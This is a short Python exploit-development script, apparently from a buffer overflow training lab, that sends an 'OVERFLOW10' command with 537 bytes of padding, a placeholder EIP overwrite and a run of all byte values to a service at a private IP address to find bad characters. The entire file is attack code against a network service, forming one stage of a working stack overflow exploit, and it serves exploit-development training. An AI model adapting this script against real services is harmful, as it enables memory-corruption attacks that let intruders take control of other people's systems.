#!/usr/bin/python3
import socket

host, port = "10.10.16.62", 1337

all_chars = bytearray(range(1,256))

bad_chars = [
        #b"\x04",
        ]


# Add bad char to bad_chars as we discover them
for bad_char in bad_chars:
    all_chars = all_chars.replace(bad_char, b"")

cmd = b"OVERFLOW10 "
pattern_length = 600 # Documentation and keep for length retention
offset = 537
new_eip = b"BBBB"

payload = b"".join([
            cmd,
            b"A" * offset,
            new_eip,
            all_chars,
            b"C" *  (pattern_length - len(new_eip) - offset - len(all_chars)),
        ])

with socket.socket() as s:
    s.connect((host,port))
    s.send(payload)
